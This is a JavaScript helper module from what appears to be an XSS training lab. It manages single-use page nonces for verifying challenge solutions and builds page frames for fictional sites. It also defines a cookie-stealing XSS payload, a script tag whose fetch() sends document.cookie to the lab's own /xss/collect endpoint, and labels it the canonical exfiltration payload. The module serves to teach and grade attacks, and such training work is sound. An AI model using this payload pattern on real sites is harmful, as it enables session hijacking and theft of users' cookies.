'use strict';
// Shared helpers for the xss module: the page-bound beacon token, the payload
// builder used by the claim boxes, and a small app frame for the fictional
// sites. No routes and no vuln metadata live here.
const crypto = require('crypto');
const { esc } = require('../../lib/page');

// ---------------------------------------------------------------------------
// Verification model: every beacon must present a per-session, per-vuln nonce
// issued when the challenge page loads. The nonce is rendered into the page as
// window.__px, so the beacon proves the payload executed in the page (or at
// least that the challenge page was loaded in this session). Nonces are
// single-use: a successful beacon consumes the nonce. A bare curl of
// /xss/collect with no page load earns no flag.
// ---------------------------------------------------------------------------
function xssNonce(req, v) {
  if (!req.session.xssNonce) req.session.xssNonce = {};
  // hasOwnProperty: never trust a plain truthiness check on a keyed map.
  if (!Object.prototype.hasOwnProperty.call(req.session.xssNonce, v)) {
    req.session.xssNonce[v] = crypto.randomBytes(16).toString('hex');
  }
  return req.session.xssNonce[v];
}

// Rendered into each challenge page so an executing payload can read it.
function xssNonceTag(req, v) {
  return `<script>window.__px=${JSON.stringify(xssNonce(req, v))};</script>`;
}

function xssConsumeNonce(req, v, n) {
  const m = req.session.xssNonce;
  const cur = m && Object.prototype.hasOwnProperty.call(m, v) ? m[v] : null;
  const ok = !!cur && cur === n && n.length > 0;
  if (ok) delete m[v]; // single-use
  return ok;
}

// The canonical exfiltration call for a vuln id. `tokenExpr` is the JavaScript
// expression that yields the page-bound token at the point where it runs.
function beacon(v, tokenExpr) {
  return `fetch('/xss/collect?c='+document.cookie+'&v=${v}&n='+${tokenExpr || 'window.__px'})`;
}

// The canonical exfiltration payload, taught in the briefing and collect page.
const EXFIL_PAYLOAD = `<script>${beacon('reflected')}</script>`;

// Small app frame so each challenge reads like a page of a real site.
// `bodyHtml` is trusted HTML; names and nav labels are escaped.
function siteFrame(appName, navLabels, bodyHtml) {
  const nav = (navLabels || []).map((n) => esc(n)).join(' · ');
  return `<div class="clay-card">
    <div class="card-top"><b>${esc(appName)}</b><span class="dim">${nav}</span></div>
    ${bodyHtml}
  </div>`;
}

// Footer links shared by every challenge page: back to the module and to this
// challenge's card on the module index.
function backLinks(vulnId) {
  return `<p class="dim"><a href="/xss#${esc(vulnId)}">Challenge card</a> · <a href="/xss">XSS module</a></p>`;
}

module.exports = { xssNonce, xssNonceTag, xssConsumeNonce, beacon, EXFIL_PAYLOAD, siteFrame, backLinks };
